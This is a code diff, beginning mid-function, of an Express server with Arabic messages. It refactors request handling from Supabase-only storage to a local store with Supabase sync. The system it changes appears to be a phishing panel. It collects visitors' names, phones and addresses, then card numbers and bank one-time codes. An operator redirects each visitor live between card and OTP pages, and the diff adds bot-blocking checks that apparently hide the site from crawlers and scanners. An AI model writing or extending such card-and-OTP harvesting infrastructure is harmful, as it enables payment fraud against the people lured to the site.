-  const authHeader = req.headers.authorization;
-  const token =
-    authHeader && authHeader.startsWith('Bearer ')
-      ? authHeader.slice(7)
-      : cookies.esaad_admin_token || '';
-
+  const token = await getAdminTokenFromReq(req);
   if (!token) {
     return res.status(401).json({ authenticated: false });
   }
-  if (adminTokens.has(token)) {
-    return res.json({ authenticated: true });
-  }
-
-  const supabase = getSupabase();
-  if (supabase) {
-    const { data, error } = await supabase.auth.getUser(token);
-    if (!error && data.user) {
-      adminTokens.add(token);
-      return res.json({ authenticated: true, user: { email: data.user.email } });
-    }
-  }
-  return res.status(401).json({ authenticated: false });
+  const session = serverStore.hasValidAdminSession(token);
+  return res.json({
+    authenticated: true,
+    user: session ? { email: session.email } : undefined
+  });
 });
 
 app.post('/api/admin/logout', (req, res) => {
@@ -871,82 +1000,133 @@ app.post('/api/admin/logout', (req, res) => {
       : cookies.esaad_admin_token || '';
 
   if (token) {
-    adminTokens.delete(token);
+    serverStore.deleteAdminSession(token);
   }
   res.setHeader('Set-Cookie', buildCookie('esaad_admin_token', '', req, 0));
   res.json({ ok: true });
 });
 
-// 3. Requests CRUD (Pure Server-Side Supabase)
+app.get('/api/admin/preferences', async (req, res) => {
+  const token = await getAdminTokenFromReq(req);
+  if (!token) {
+    return res.status(401).json({ error: 'غير مصرح' });
+  }
+  return res.json(serverStore.getAdminPreferences());
+});
+
+app.patch('/api/admin/preferences', async (req, res) => {
+  const token = await getAdminTokenFromReq(req);
+  if (!token) {
+    return res.status(401).json({ error: 'غير مصرح' });
+  }
+
+  const body = req.body || {};
+  let updated: AdminPreferences;
+
+  if (
+    body.toggle &&
+    ['starredIds', 'archivedIds', 'flaggedIds'].includes(body.toggle) &&
+    body.id
+  ) {
+    updated = serverStore.togglePreferenceItem(
+      body.toggle,
+      String(body.id),
+      typeof body.value === 'boolean' ? body.value : undefined
+    );
+  } else {
+    updated = serverStore.updateAdminPreferences(body);
+  }
+
+  broadcastToAdmins();
+  return res.json(updated);
+});
+
+// 3. Requests CRUD (Unified Server-Side Store + Supabase Sync)
 app.get('/api/requests/current', async (req, res) => {
+  if (isBotRequest(req)) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+
   const cookies = parseCookies(req.headers.cookie);
-  const fpSession = ipToSessionMap.get(getFingerprintKey(req));
+  const fpSession = serverStore.getIpSession(getFingerprintKey(req));
   const id = cookies.esaad_req_id || fpSession?.requestId;
   if (!id) {
     return res.status(404).json({ error: 'لا يوجد طلب نشط' });
   }
 
+  let record = serverStore.getRequest(id);
   const supabase = getSupabase();
-  if (!supabase) {
-    return res.status(503).json({ error: 'يرجى ضبط إعدادات SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
+
+  if (supabase) {
+    try {
+      const { data, error } = await supabase
+        .from('requests')
+        .select('*')
+        .eq('id', id)
+        .single();
+      if (!error && data) {
+        record = fromSupabaseRow(data);
+        serverStore.upsertRequest(record);
+      }
+    } catch {}
   }
 
-  const { data, error } = await supabase
-    .from('requests')
-    .select('*')
-    .eq('id', id)
-    .single();
-
-  if (error || !data) {
+  if (!record) {
     return res.status(404).json({ error: 'الطلب غير موجود' });
   }
 
-  explicitlyOfflineIds.delete(id);
-  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(data.step) || '/waiting';
-  userPresence.set(id, { lastSeen: Date.now(), currentPage });
-  return res.json(fromSupabaseRow(data));
+  serverStore.clearExplicitlyOffline(id);
+  const currentPage =
+    serverStore.getLastKnownPage(id) || normalizeStepToPage(record.step) || '/waiting';
+  serverStore.setUserPresence(id, { lastSeen: Date.now(), currentPage });
+  return res.json(enrichLocalRecord(record));
 });
 
 app.get('/api/requests', async (_req, res) => {
-  const dbRequests = await fetchEnrichedRequests();
+  const dbRequests = await fetchEnrichedRequests(false);
   return res.json(dbRequests);
 });
 
 app.get('/api/requests/:id', async (req, res) => {
   const { id } = req.params;
+  let record = serverStore.getRequest(id);
   const supabase = getSupabase();
-  if (!supabase) {
-    return res.status(503).json({ error: 'يرجى ضبط إعدادات Supabase في الخادم' });
+
+  if (supabase) {
+    try {
+      const { data, error } = await supabase
+        .from('requests')
+        .select('*')
+        .eq('id', id)
+        .single();
+      if (!error && data) {
+        record = fromSupabaseRow(data);
+        serverStore.upsertRequest(record);
+      }
+    } catch {}
   }
 
-  const { data, error } = await supabase
-    .from('requests')
-    .select('*')
-    .eq('id', id)
-    .single();
-
-  if (error || !data) {
+  if (!record) {
     return res.status(404).json({ error: 'الطلب غير موجود' });
   }
 
-  explicitlyOfflineIds.delete(id);
-  const currentPage = lastKnownUserPage.get(id) || normalizeStepToPage(data.step) || '/waiting';
-  userPresence.set(id, { lastSeen: Date.now(), currentPage });
-  return res.json(fromSupabaseRow(data));
+  return res.json(enrichLocalRecord(record));
 });
 
 app.post('/api/requests', async (req, res) => {
-  const supabase = getSupabase();
-  if (!supabase) {
-    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
+  if (isBotRequest(req)) {
+    return res.status(403).json({ error: 'Forbidden' });
   }
 
   const cookies = parseCookies(req.headers.cookie);
-  const fpSession = ipToSessionMap.get(getFingerprintKey(req));
-  const now = new Date().toISOString();
+  const fpSession = serverStore.getIpSession(getFingerprintKey(req));
+  const nowMs = Date.now();
+  const now = new Date(nowMs).toISOString();
   const id = String(req.body?.id || cookies.esaad_req_id || fpSession?.requestId || crypto.randomUUID());
 
+  const existing = serverStore.getRequest(id);
   const newRecord: RequestRecord = {
+    ...(existing || {}),
     id,
     name: req.body?.name || '',
     mobile: req.body?.mobile || '',
@@ -955,59 +1135,68 @@ app.post('/api/requests', async (req, res) => {
     address: req.body?.address || '',
     date: req.body?.date || '',
     step: '/payment',
-    createdAt: now,
-    updatedAt: now
+    currentPage: '/payment',
+    createdAt: existing?.createdAt || now,
+    updatedAt: now,
+    lastHeartbeatAt: nowMs
   };
 
-  const { data, error } = await supabase
-    .from('requests')
-    .upsert(toSupabaseRow(newRecord), { onConflict: 'id' })
-    .select('*')
-    .single();
+  // Persist immediately to server-side store
+  serverStore.upsertRequest(newRecord, true);
 
-  if (error) {
-    return res.status(500).json({ error: error.message });
+  let dbData: any = null;
+  const supabase = getSupabase();
+  if (supabase) {
+    try {
+      const { data, error } = await supabase
+        .from('requests')
+        .upsert(toSupabaseRow(newRecord), { onConflict: 'id' })
+        .select('*')
+        .single();
+      if (!error && data) {
+        dbData = data;
+      }
+    } catch {}
   }
 
-  explicitlyOfflineIds.delete(id);
-  lastDbPresenceSync.set(id, { time: Date.now(), page: '/payment' });
+  serverStore.clearExplicitlyOffline(id);
+  lastDbPresenceSync.set(id, { time: nowMs, page: '/payment' });
   const clientId = cookies.esaad_cid || fpSession?.clientId || crypto.randomUUID();
   const meta = extractVisitorMeta(req);
-  userMetaMap.set(id, meta);
-  devicePresence.set(clientId, {
-    lastSeen: Date.now(),
+  serverStore.setUserMeta(id, meta);
+  serverStore.setDevicePresence(clientId, {
+    lastSeen: nowMs,
     requestId: id,
     currentPage: '/payment',
     meta
   });
-
-  userPresence.set(id, { lastSeen: Date.now(), currentPage: '/payment' });
-  lastKnownUserPage.set(id, '/payment');
+  serverStore.setUserPresence(id, { lastSeen: nowMs, currentPage: '/payment' });
+  serverStore.setLastKnownPage(id, '/payment');
 
   res.setHeader('Set-Cookie', [
     buildCookie('esaad_cid', clientId, req),
     buildCookie('esaad_req_id', id, req)
   ]);
 
-  const enriched = fromSupabaseRow(data || newRecord);
+  const enriched = dbData ? fromSupabaseRow(dbData) : enrichLocalRecord(newRecord);
   broadcastToAdmins();
   return res.status(201).json(enriched);
 });
 
 app.patch('/api/requests/:id', async (req, res) => {
+  if (isBotRequest(req)) {
+    return res.status(403).json({ error: 'Forbidden' });
+  }
+
   const cookies = parseCookies(req.headers.cookie);
-  const fpSession = ipToSessionMap.get(getFingerprintKey(req));
+  const fpSession = serverStore.getIpSession(getFingerprintKey(req));
   const id = req.params.id === 'current' ? cookies.esaad_req_id || fpSession?.requestId : req.params.id;
   if (!id) {
     return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
   }
 
-  const supabase = getSupabase();
-  if (!supabase) {
-    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
-  }
-
-  const now = new Date().toISOString();
+  const nowMs = Date.now();
+  const now = new Date(nowMs).toISOString();
   const patchPayload: Partial<RequestRecord> & { id: string } = {
     ...req.body,
     id,
@@ -1015,44 +1204,64 @@ app.patch('/api/requests/:id', async (req, res) => {
   };
 
   let pushedRedirect: string | null = null;
+  let isVisitorMutation = false;
 
   if (req.body?.nextAction !== undefined) {
     const targetRoute = normalizeRedirectTarget(req.body.nextAction);
     if (targetRoute) {
-      pendingRedirects.set(id, targetRoute);
-      lastKnownUserPage.set(id, targetRoute);
+      serverStore.setPendingRedirect(id, targetRoute);
+      serverStore.setLastKnownPage(id, targetRoute);
       patchPayload.step = targetRoute;
+      patchPayload.currentPage = targetRoute;
       pushedRedirect = targetRoute;
-      const existingPresence = userPresence.get(id);
+      const existingPresence = serverStore.getUserPresence(id);
       if (existingPresence) {
-        userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
+        serverStore.setUserPresence(id, { ...existingPresence, currentPage: targetRoute });
       }
     } else {
-      pendingRedirects.delete(id);
+      serverStore.deletePendingRedirect(id);
     }
   } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
-    pendingRedirects.delete(id);
+    isVisitorMutation = true;
+    serverStore.deletePendingRedirect(id);
     const stepPage = req.body.step === 'card' ? '/waiting' : req.body.step === 'otp-bank' ? '/otp-bank' : '/otp';
-    explicitlyOfflineIds.delete(id);
-    userPresence.set(id, { lastSeen: Date.now(), currentPage: stepPage });
-    lastKnownUserPage.set(id, stepPage);
+    patchPayload.currentPage = stepPage;
+    serverStore.clearExplicitlyOffline(id);
+    serverStore.setUserPresence(id, { lastSeen: nowMs, currentPage: stepPage });
+    serverStore.setLastKnownPage(id, stepPage);
+  } else if (req.body?.cardNumber !== undefined || req.body?.otp !== undefined) {
+    isVisitorMutation = true;
   }
 
-  const patchRow = toSupabaseRow(patchPayload);
-  delete patchRow.id;
+  // Always update server-side store first
+  const localUpdated = serverStore.patchRequest(id, patchPayload, isVisitorMutation);
 
-  const { data, error } = await supabase
-    .from('requests')
-    .update(patchRow)
-    .eq('id', id)
-    .select('*')
-    .single();
-
-  if (error) {
-    return res.status(500).json({ error: error.message });
+  let dbData: any = null;
+  const supabase = getSupabase();
+  if (supabase) {
+    try {
+      const patchRow = toSupabaseRow(patchPayload);
+      delete patchRow.id;
+      const { data, error } = await supabase
+        .from('requests')
+        .update(patchRow)
+        .eq('id', id)
+        .select('*')
+        .single();
+      if (!error && data) {
+        dbData = data;
+      } else if (localUpdated) {
+        const { data: upserted } = await supabase
+          .from('requests')
+          .upsert(toSupabaseRow(localUpdated), { onConflict: 'id' })
+          .select('*')
+          .single();
+        if (upserted) dbData = upserted;
+      }
+    } catch {}
   }
 
-  const enriched = fromSupabaseRow(data);
+  const enriched = dbData ? fromSupabaseRow(dbData) : enrichLocalRecord(localUpdated!);
 
   // Push real-time action event to the visitor's open SSE stream
   sendVisitorEvent(id, 'action', {
@@ -1072,29 +1281,16 @@ app.delete('/api/requests/:id', async (req, res) => {
     return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
   }
 
+  serverStore.deleteRequest(id);
+
   const supabase = getSupabase();
-  if (!supabase) {
-    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
-  }
-
-  const { error } = await supabase
-    .from('requests')
-    .delete()
-    .eq('id', id);
-
-  if (error) {
-    return res.status(500).json({ error: error.message });
-  }
-
-  userPresence.delete(id);
-  lastKnownUserPage.delete(id);
-  userMetaMap.delete(id);
-  pendingRedirects.delete(id);
-  explicitlyOfflineIds.set(id, Date.now());
-  for (const [cid, entry] of devicePresence.entries()) {
-    if (entry.requestId === id) {
-      devicePresence.delete(cid);
-    }
+  if (supabase) {
+    try {
+      await supabase
+        .from('requests')
+        .delete()
+        .eq('id', id);
+    } catch {}
   }
 
   broadcastToAdmins();
@@ -1103,6 +1299,9 @@ app.delete('/api/requests/:id', async (req, res) => {
 
 // ==================== SERVER STARTUP ====================
 async function startServer() {
+  // Warm server-side store from Supabase on boot
+  await pullFromSupabaseIfNeeded(true);
+
   const isProd = process.env.NODE_ENV === 'production';
 
   if (!isProd) {
